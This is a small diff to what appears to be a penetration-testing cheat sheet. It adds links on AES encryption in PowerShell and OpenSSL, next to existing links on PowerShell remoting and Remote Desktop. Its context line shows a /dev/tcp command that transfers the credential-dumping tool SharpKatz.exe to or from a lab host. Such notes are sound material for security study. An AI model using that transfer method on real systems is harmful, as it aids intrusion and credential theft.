@@ -39,3 +39,8 @@ at < /dev/tcp/192.168.49.128/443 > SharpKatz.exe (vice versa)
 https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/running-remote-commands?view=powershell-7.6&viewFallbackFrom=powershell-7.2
 
 https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc
+
+
+Encryption:
+  https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1
+  https://docs.openssl.org/1.1.1/man1/enc/
